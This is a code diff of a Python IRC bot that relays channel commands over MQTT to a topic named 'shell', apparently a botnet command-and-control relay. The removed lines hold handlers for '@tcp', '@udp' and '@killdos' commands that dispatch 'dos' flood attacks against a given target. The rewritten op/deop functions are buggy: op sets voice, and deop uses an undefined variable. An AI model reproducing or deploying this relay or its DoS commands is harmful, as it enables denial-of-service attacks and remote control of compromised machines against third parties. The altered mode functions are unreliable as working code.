@@ -21,7 +21,7 @@ print("""
 import socket,string,time,re,binascii,base64,operator,json,argparse,sys
 import paho.mqtt.client as mqtt
 import paho.mqtt.publish as publish
-auth_users = ['shellz', 'kek', '#mqtt']
+
 # version of this bot
 bot_version = "1.4 Beta"
 # initialize some vars
@@ -110,25 +110,27 @@ def join_chan(join_str_):
     if verbose or debug: print("Joining %s" % join_str_)
     ircsend("JOIN",join_str_,null)
 
-def op(to_op, chan):
-    if verbose or debug: print("Opping %s" % to_top)
-    ircsend( 'MODE ' + chan + ' +o: ' + to_op)
-
-def deop(to_deop, chan):
-    if verbose or debug: print("Deopping %s" % to_deop)
-    ircsend( 'MODE ' + chan + ' -o: ' + to_deop)
-
-def voice(to_v, chan):
-    if verbose or debug: print("Voicing %s" % to_v)
-    ircsend( 'MODE ' + chan + ' +v: ' + to_v)
-
-def devoice(to_dv, chan):
-    if verbose or debug: print("Devoicing %s" % to_dv)
-    ircsend( 'MODE ' + chan + ' -v: ' + to_dv)
-
 def mode(user, flags):
     if verbose or debug: print("Mode %s:%s" % (user,flags))
     ircsend( 'MODE ', user + " ",flags)
+
+def op(to_op, chan):
+    if verbose or debug: print("Opping %s" % to_op)
+    ircsend( 'MODE ', chan, '+v: '+to_op)
+
+def deop(to_deop, chan):
+    if verbose or debug: print("Deopping %s" % to_deop)
+    ircsend( 'MODE ', chan, '+v: '+to_op)
+
+def voice(to_v, chan):
+    if verbose or debug: print("Voicing %s" % to_v)
+    ircsend( 'MODE ', chan, '+v: '+to_v)
+
+def devoice(to_dv, chan):
+    if verbose or debug: print("Devoicing %s" % to_dv)
+    ircsend( 'MODE ', chan + ' -v: ' + to_dv)
+
+
 
 # Called after first pong
 def init_irc(CHANNEL_,KEY_,irc_auth_):
@@ -544,62 +546,7 @@ def listen_irc(irc_auth,chan_key,dispass,priv_user,CHANNEL):
                     if verbose:
                         print("Shutting down...")
                     quit_irc(sender)
-                # ddos commands
-                elif re.match(r'^:@tcp.*$', line[3]):
-                    if not enabled:
-                        ircsend(action,sender,"Access denied.")
-                        break
-                    if not bot_whitelist(sender, action):
-                        ircsend(action,sender,"Access denied.")
-                        break
-                    scount+=1
-                    if debug or verbose:
-                        print("Received tcp dos command: %s from %s" % (final,sender))
-                    try:
-                        mqsend("dos -t %s >/dev/null 2>&1" % final)
-                    except Exception as e:
-                        s.send("%s %s :Error publishing message\n" % (action,sender))
-                        if verbose:
-                            print("Failed to publish message!")
-                        if debug:
-                            print("Error:\n %s" % e)
-                elif re.match(r'^:@udp.*$', line[3]):
-                    if not enabled:
-                        ircsend(action,sender,"Access denied.")
-                        break
-                    if not bot_whitelist(sender, action):
-                        ircsend(action,sender,"Access denied.")
-                        break
-                    scount+=1
-                    if debug or verbose:
-                        print("Received udp dos command: %s from %s" % (final,sender))
-                    try:
-                        mqsend("dos -u %s >/dev/null 2>&1" % final)
-                    except Exception as e:
-                        ircsend(action,sender,"Error publishing message")
-                        if verbose:
-                            print("Failed to publish message!")
-                        if debug:
-                            print("Error:\n %s" % e)
-                elif re.match(r'^:@killdos.*$', line[3]):
-                    if not enabled:
-                        ircsend(action,sender,"Access denied.")
-                        break
-                    if not bot_whitelist(sender, action):
-                        ircsend(action,sender,"Access denied.")
-                        break
-                    scount+=1
-                    if verbose or debug:
-                        print("Received a kill from %s, killing all attacks" % sender)
-                    ircsend(action,sender,"Killing all attacks")
-                    try:
-                        mqsend("dos -k >/dev/null 2>&1")
-                    except Exception as e:
-                        ircsend(action,sender,"Error publishing message")
-                        if verbose:
-                            print("Failed to publish message!")
-                        if debug:
-                            print("Error:\n %s" % e)
+                
                 else:
                     pass
 
@@ -628,53 +575,65 @@ def bot_usage(action, sender):
 
 ######## Program start
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-m','--mq_host',default='localhost', help='Mqtt host to connect to')
-parser.add_argument('-p','--mq_port',default='1883', help='Mqtt port to connect to')
-parser.add_argument('-u','--mq_user',default='user', help='Mqtt user to auth with')
-parser.add_argument('-P','--mq_pass',default='password', help='Mqtt password to authenticate with')
-parser.add_argument('-s','--mq_subtop',default='data', help='Mqtt topic to subscribe to')
-parser.add_argument('-t','--mq_pubtop',default='shell', help='Mqtt topic to publish to')
-parser.add_argument('-i','--irc_host',default='localhost', help='Irc host to connect to')
-parser.add_argument('-I','--irc_port',default='6667', help='Irc port to connect to')
-parser.add_argument('-n','--irc_nick',default='mqirc', help='Nick of irc user')
-parser.add_argument('-c','--irc_chan',default='#mqtt', help='Irc channel to join')
-parser.add_argument('-k','--chan_key',default='lolololol', help='Channel key')
-parser.add_argument('-a','--irc_auth',default='empty', help='Password to auth with nickserv')
-parser.add_argument('-K','--bot_key',default='mqirc', help='Password to auth with bot')
+from config import Config, ConfigList
+from optparse import OptionParser
 
-parser.add_argument('-U','--priv_user',default='anon', help='Irc bot owner')
-parser.add_argument('-d','--debug', nargs='?', default=False, help='Print debug messages')
-parser.add_argument('-v','--verbose', nargs='?', default=False, help='Verbose mode')
-parser.add_argument('-vv','--very_verbose', nargs='?', default=False, help='Very Verbose mode: Print all raw output')
+def getMergedConfig(filename):
+    optcfg = Config()
+    filecfg = Config(filename)
+    parser = OptionParser()
+    parser.add_option('-v', '--verbose', action='store_true', dest='verbose', help='Produce verbose output')
+    parser.add_option('-d','--debug', nargs='?', default=False, help='Print debug messages')
+    parser.add_option('-V','--very_verbose', nargs='?', default=False, help='Very Verbose mode: Print all raw output')
+    parser.add_option('-b','--base64_on', nargs='?', default=False, help='Base64')
+    parser.add_option('-N','--notice', action='store_true', dest='notice', help='Respond to notices')
 
-parser.add_argument('-b','--base64_on', nargs='?', default=False, help='Base64')
-parser.add_argument('-N','--notice', nargs='?', default=False, help='Respond to notices')
+    parser.add_option('-m','--mq_host',default='localhost', help='Mqtt host to connect to')
+    parser.add_option('-p','--mq_port',default='1883', help='Mqtt port to connect to')
+    parser.add_option('-u','--mq_user',default='user', help='Mqtt user to auth with')
+    parser.add_option('-P','--mq_pass',default='password', help='Mqtt password to authenticate with')
+    parser.add_option('-s','--mq_subtop',default='data', help='Mqtt topic to subscribe to') 
+    parser.add_option('-t','--mq_pubtop',default='shell', help='Mqtt topic to publish to')
+    
+    parser.add_option('-i','--irc_host',default='localhost', help='Irc host to connect to')
+    parser.add_option('-I','--irc_port',default='6667', help='Irc port to connect to')
+    parser.add_option('-n','--irc_nick',default='mqirc', help='Nick of irc user')
+    parser.add_option('-c','--irc_chan',default='#mqtt', help='Irc channel to join')
+    parser.add_option('-k','--chan_key',default='lolololol', help='Channel key')
+    parser.add_option('-a','--irc_auth',default='empty', help='Password to auth with nickserv')
+    parser.add_option('-K','--bot_key',default='mqirc', help='Password to auth with bot')
+    parser.add_option('-U','--priv_user',default='anon', help='Irc bot owner')
+    args = parser.parse_args(None, optcfg)[1]
+    cfglist = ConfigList()
+    cfglist.append(optcfg)
+    cfglist.append(filecfg)
+    return cfglist, args
 
+auth_users = ['shellz', 'kek', '#mqtt']
 
+cfg, args = getMergedConfig('mqconfig.cfg')
 
-ns = parser.parse_args()
+verbose=cfg.getByPath('verbose')
+very_verbose=cfg.getByPath('very_verbose')
+notice=cfg.getByPath('notice')    
+base64_on=cfg.getByPath('base64_on')
+debug=cfg.getByPath('debug')
 
-mq_host = ns.mq_host if ns.mq_host is not None else "default_mq_host"
-mq_port = ns.mq_port if ns.mq_port is not None else "default_mq_port"
-mq_user = ns.mq_user if ns.mq_user is not None else "default_mq_user"
-mq_pass = ns.mq_pass if ns.mq_pass is not None else "default_mq_pass"
-mq_subtop = ns.mq_subtop if ns.mq_subtop is not None else "default_mq_subtop"
-mq_pubtop = ns.mq_pubtop if ns.mq_pubtop is not None else "default_mq_pubtop"
-irc_host = ns.irc_host if ns.irc_host is not None else "default_irc_host"
-irc_port = ns.irc_port if ns.irc_port is not None else "default_irc_port"
-irc_nick = ns.irc_nick if ns.irc_nick is not None else "default_irc_nick"
-irc_chan = ns.irc_chan if ns.irc_chan is not None else "default_irc_chan"
-chan_key = ns.chan_key if ns.chan_key is not None else "default_chan_key"
-bot_key = ns.bot_key if ns.bot_key is not None else "default_bot_key"
-irc_auth = ns.irc_auth if ns.irc_auth is not None else "default_irc_auth"
-priv_user = ns.priv_user if ns.priv_user is not None else "default_priv_user"
-debug = ns.debug if ns.debug is not None else "default_debug"
-verbose = ns.verbose if ns.verbose is not None else "default_verbose"
-very_verbose = ns.very_verbose if ns.very_verbose is not None else "default_very_verbose"
-base64_on = ns.base64_on if ns.base64_on is not None else "default_base64_on"
-notice = ns.notice if ns.notice is not None else "default_notice"
+mq_host=cfg.getByPath('mq_host')
+mq_port=cfg.getByPath('mq_port')
+mq_user=cfg.getByPath('mq_user')
+mq_pass=cfg.getByPath('mq_pass')
+mq_subtop=cfg.getByPath('mq_subtop')
+mq_pubtop=cfg.getByPath('mq_pubtop')
 
+irc_auth=cfg.getByPath('irc_auth')
+irc_nick=cfg.getByPath('irc_nick')
+irc_host=cfg.getByPath('irc_host')
+irc_port=cfg.getByPath('irc_port')
+irc_chan=cfg.getByPath('irc_chan')
+chan_key=cfg.getByPath('chan_key')
+bot_key=cfg.getByPath('bot_key')
+priv_user=cfg.getByPath('priv_user')
 
 HOST = irc_host
 PORT = int(irc_port)
